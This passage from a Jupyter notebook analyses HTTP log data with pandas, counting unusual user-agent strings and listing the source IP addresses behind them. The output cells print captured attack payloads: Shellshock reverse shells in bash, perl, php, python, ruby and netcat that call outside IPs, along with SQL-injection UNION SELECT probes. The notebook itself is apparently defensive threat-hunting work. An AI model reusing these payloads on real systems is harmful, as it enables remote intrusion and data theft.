       "Mozilla/5.0 WinInet                                                                                                                                                                                                                                         2 \n",
       "Mozilla/5.0 (Windows NT 6.1; WOW62; rv:53.0) Gecko/20100101 Chrome /53.0                                                                                                                                                                                    2 \n",
       "Mozilla/5.0 (Windows NT 10.0;Win64;x64)                                                                                                                                                                                                                     2 \n",
       "Mozilla/5.0 (Windows NT 5.1 ; v.)                                                                                                                                                                                                                           2 \n",
       "Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19                                                                                                              1 \n",
       "() { :; }; /bin/bash -i >& /dev/tcp/31.254.228.4/48051 0>&1                                                                                                                                                                                                 1 \n",
       "() { :; }; /usr/bin/perl -e 'use Socket;$i=\"83.0.8.119\";$p=57432;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'            1 \n",
       "() { :; }; /usr/bin/php -r '$sock=fsockopen(\"229.229.189.246\",62570);exec(\"/bin/sh -i <&3 >&3 2>&3\");'                                                                                                                                                      1 \n",
       "() { :; }; /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"150.45.133.97\",54611));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'  1 \n",
       "() { :; }; /usr/bin/ruby -rsocket -e'f=TCPSocket.open(\"227.110.45.126\",43870).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'                                                                                                                        1 \n",
       "1' UNION SELECT '1','2','automatedscanning','1233627891','5'/*                                                                                                                                                                                              1 \n",
       "1' UNION SELECT -1,'autosc','test','O:8:\\\"stdClass\\\":3:{s:3:\\\"mod\\\";s:15:\\\"resourcesmodule\\\";s:3:\\\"src\\\";s:20:\\\"@random41940ceb78dbb\\\";s:3:\\\"int\\\";s:0:\\\"\\\";}',7,0,0,0,0,0,0 /*                                                                             1 \n",
       "1' UNION SELECT 1,1409605378,1,1,1,1,1,1,1,1/*&blogId=1                                                                                                                                                                                                     1 \n",
       "1' UNION SELECT 1729540636,concat(0x61,0x76,0x64,0x73,0x73,0x63,0x61,0x6e,0x65,0x72, --                                                                                                                                                                     1 \n",
       "1' UNION/**/SELECT/**/1,2,434635502,4/*&blog=1                                                                                                                                                                                                              1 \n",
       "1' UNION/**/SELECT/**/994320606,1,1,1,1,1,1,1/*&blogId=1                                                                                                                                                                                                    1 \n",
       "Mozilla/5.0 (Linux; Android 4.4; Nexus 5 Build/_BuildID_) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36                                                                                                           1 \n",
       "Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.65 Mobile Safari/537.36                                                                                                    1 \n",
       "Mozilla/5.0 (Linux; U; Android 4.1.1; en-gb; Build/KLP) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30                                                                                                                                    1 \n",
       "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/603.1.23 (KHTML, like Gecko) Version/10.0 Mobile/14E5239e Safari/602.1                                                                                                                   1 \n",
       "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) CriOS/56.0.2924.75 Mobile/14E5239e Safari/602.1                                                                                                             1 \n",
       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12                                                                                                                                      1 \n",
       "() { :; }; /bin/bash -c '/bin/nc 55535 220.132.33.81 -e /bin/bash'                                                                                                                                                                                          1 "
      ]
     },
     "execution_count": 12,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "pd.DataFrame(df[df['user_agent'].isin(df1['user_agent'].values)].groupby('user_agent').size().sort_values(ascending=False))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "97"
      ]
     },
     "execution_count": 13,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "ua_df = pd.DataFrame(df[df['user_agent'].isin(df1['user_agent'].values)].groupby('user_agent').size().sort_values(ascending=False))\n",
    "df2 = df[df['user_agent'].isin(ua_df[ua_df[0] <= 5].index)]\n",
    "len(df2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "111.81.145.191,42.191.112.181,168.66.108.62,217.132.156.225,106.132.195.153,135.32.99.116,231.179.108.238,45.239.232.245,83.0.8.119,173.37.160.150,187.152.203.243,66.116.147.181,253.182.102.55,44.74.106.131,10.122.158.57,23.49.177.78,220.132.33.81,229.133.163.235,95.166.116.45,200.75.228.240,226.102.56.13,118.196.230.170,87.195.80.126,34.155.174.167,252.122.243.212,42.103.246.250,34.129.179.28,42.103.246.130,92.213.148.0,190.245.228.38,31.254.228.4,10.155.246.29,104.179.109.113,226.240.188.154,68.115.251.76,56.5.47.137,250.22.86.40,238.143.78.114,103.235.93.133,9.206.212.33,135.203.243.43,249.34.9.16,150.45.133.97,37.216.249.50,131.186.145.73,102.143.16.184,187.178.169.123,106.93.213.219,13.39.153.254,0.216.249.31,142.128.135.10,148.146.134.52,29.0.183.220,69.221.145.150,61.110.82.125,27.88.56.114,28.169.41.122,22.34.153.164,118.26.57.38,253.65.40.39,80.244.147.207,31.116.232.143,227.110.45.126,2.240.116.254,19.235.69.221,249.237.77.152,230.246.50.221,229.229.189.246,75.73.228.192,116.116.98.205,42.127.244.30,81.14.204.154,2.230.60.70,84.147.231.129,186.28.46.179,223.149.180.133,121.7.186.163,185.19.7.133,65.153.114.120,44.164.136.41,42.16.149.112,53.160.218.44,126.102.12.53,50.154.111.0,249.90.116.138,158.171.84.209,123.127.233.97,203.68.29.5,140.60.154.239,225.191.220.138,97.220.93.190,48.66.193.176,129.121.121.48,49.161.8.58\n"
     ]
    }
   ],
   "source": [
    "print(','.join(set(df2['id.orig_h'].values)))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
